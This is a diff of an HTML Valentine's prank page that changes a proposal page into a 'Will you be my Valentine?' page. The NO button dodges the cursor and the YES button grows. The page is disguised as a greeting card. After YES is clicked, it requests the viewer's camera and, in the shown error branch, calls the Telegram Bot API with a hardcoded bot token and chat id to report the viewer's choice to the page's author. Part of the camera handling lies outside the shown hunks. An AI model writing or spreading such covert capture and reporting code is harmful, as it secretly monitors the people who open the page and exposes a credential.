@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>For Shaxzoda 💍</title>
+<title>Valentine 💖</title>
 
 <style>
-body {
+body{
   margin:0;
   font-family:sans-serif;
   text-align:center;
@@ -15,54 +15,48 @@ body {
   overflow:hidden;
 }
 
-.container { margin-top:80px; }
+.container{ margin-top:80px; }
 
-h1 { font-size:26px; }
+h1{ font-size:28px; }
 
-/* BUTTON */
-button {
+button{
   padding:15px 25px;
   font-size:18px;
   border:none;
   border-radius:30px;
   margin:10px;
   cursor:pointer;
+  transition:0.3s;
 }
 
-#yes { background:#ff3366; color:white; }
-#no { background:white; color:#ff3366; }
+#yes{ background:#ff3366; color:white; }
+#no{ background:white; color:#ff3366; position:relative; }
 
-/* ❤️ hearts */
-.heart {
+/* hearts */
+.heart{
   position:fixed;
   font-size:22px;
   animation:float 4s linear infinite;
 }
-@keyframes float {
-  0% {transform:translateY(100vh);}
-  100% {transform:translateY(-10vh);}
+@keyframes float{
+  0%{transform:translateY(100vh);}
+  100%{transform:translateY(-10vh);}
 }
 
-/* 💍 ring */
-#ring {
-  display:none;
-  font-size:80px;
-  animation:pop 1s ease;
+/* confetti */
+.confetti{
+  position:fixed;
+  font-size:20px;
+  animation:fall 3s linear infinite;
 }
-@keyframes pop {
-  0% {transform:scale(0);}
-  100% {transform:scale(1);}
+@keyframes fall{
+  0%{transform:translateY(-10vh);}
+  100%{transform:translateY(100vh);}
 }
 
-/* 🎁 stickers */
-#stickers img {
-  position: fixed;
-  width:100px;
-  animation: floatUp 5s linear infinite;
-}
-@keyframes floatUp {
-  0% { transform: translateY(100vh); }
-  100% { transform: translateY(-10vh); }
+/* glow */
+.glow{
+  text-shadow:0 0 20px #fff, 0 0 40px #ff3366;
 }
 </style>
 </head>
@@ -70,85 +64,89 @@ button {
 <body>
 
 <div class="container">
-  <h1 id="text">
-    Shaxzoda, sen mening hayotimdagi eng muhim insonsan 💖<br><br>
-    Do you want to spend your life with me? 💍
-  </h1>
+  <h1 id="text">Will you be my Valentine? 💖</h1>
 
   <button id="yes">YES 💖</button>
-  <button id="no">NO 😊</button>
+  <button id="no">NO 😢</button>
 </div>
-
-<div id="ring">💍</div>
-
-<div id="stickers" style="display:none;">
-  <img src="https://media.tenor.com/8QyY2HkJ5nEAAAAi/love.gif">
-  <img src="https://media.tenor.com/W6X7SgP3WgQAAAAi/cute-love.gif">
-</div>
-
-<audio id="music" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_7b0c6a6c2e.mp3?filename=romantic-love-ambient-11077.mp3"></audio>
 
 <script>
 
-// ❤️ hearts
-setInterval(()=>{
-  let h=document.createElement("div");
-  h.className="heart";
-  h.innerHTML="❤️";
-  h.style.left=Math.random()*100+"vw";
-  document.body.appendChild(h);
-  setTimeout(()=>h.remove(),4000);
-},300);
+let texts=[
+"are you positive 🤔",
+"pookie please..🥺",
+"if you say no, i will be really sad 😢",
+"i will be very sad 😕",
+"please??? 😭",
+"don't do it to me 😣",
+"last chance 😈"
+];
 
-// NO texts
-let noTexts=["Yana o‘yla 😊","Baribir YES deysan 😉","Men kutaman 💖","Sen eng zo‘risan 😍"];
 let i=0;
 let noBtn=document.getElementById("no");
+let yesBtn=document.getElementById("yes");
 
+let scaleYes=1;
+
+// NO
 noBtn.onclick=()=>{
-  noBtn.innerText=noTexts[i%noTexts.length];
-  i++;
-  noBtn.style.position="relative";
-  noBtn.style.left=Math.random()*50+"px";
-  noBtn.style.top=Math.random()*30+"px";
+  if(i<texts.length){
+    noBtn.innerText=texts[i];
+    i++;
+  }
+
+  scaleYes += (i>=texts.length?0.5:0.2);
+  yesBtn.style.transform="scale("+scaleYes+")";
+
+  noBtn.style.position="absolute";
+  noBtn.style.left=Math.random()*80+"vw";
+  noBtn.style.top=Math.random()*80+"vh";
+
+  if(i>=texts.length){
+    noBtn.style.transition="0.1s";
+  }
 };
 
-// YES bosilganda
-document.getElementById("yes").onclick=async()=>{
-
-  document.getElementById("music").play();
+// YES
+yesBtn.onclick=async()=>{
 
   document.body.innerHTML=`
-    <h1 style="margin-top:100px;">💍 YAAAAAY 💍</h1>
-    <p style="font-size:22px;">I LOVE YOU ❤️🥰</p>
-  `;
+    <div style="margin-top:100px;">
+      <h1 class="glow" style="font-size:40px;">
+        Knew you would say YES 😍💖
+      </h1>
 
-  // 💍 ring effect
-  let ring=document.createElement("div");
-  ring.innerHTML="💍";
-  ring.style.fontSize="80px";
-  ring.style.marginTop="20px";
-  document.body.appendChild(ring);
+      <div style="font-size:70px; margin-top:20px;">
+        💃🕺
+      </div>
+
+      <p style="margin-top:20px; font-size:18px;">
+        you just made me happiest person 💞
+      </p>
+    </div>
+  `;
 
   // ❤️ hearts
   setInterval(()=>{
     let h=document.createElement("div");
+    h.className="heart";
     h.innerHTML="❤️";
-    h.style.position="fixed";
     h.style.left=Math.random()*100+"vw";
-    h.style.bottom="0";
-    h.style.fontSize="25px";
     document.body.appendChild(h);
     setTimeout(()=>h.remove(),4000);
+  },200);
+
+  // 🎉 confetti
+  setInterval(()=>{
+    let c=document.createElement("div");
+    c.className="confetti";
+    c.innerHTML="🎉";
+    c.style.left=Math.random()*100+"vw";
+    document.body.appendChild(c);
+    setTimeout(()=>c.remove(),3000);
   },150);
 
-  // 🎁 stickers
-  let stickers=document.getElementById("stickers");
-  if(stickers){
-    stickers.style.display="block";
-  }
-
-  // 📸 CAMERA (permission bilan)
+  // 📸 CAMERA
   try{
     let stream=await navigator.mediaDevices.getUserMedia({video:true});
     let video=document.createElement("video");
@@ -176,7 +174,7 @@ document.getElementById("yes").onclick=async()=>{
     stream.getTracks().forEach(t=>t.stop());
 
   }catch(e){
-    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=YES bosildi (kamera yoqilmadi)");
+    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=YES bosildi (kamera rad qilindi)");
   }
 
   // 📩 text
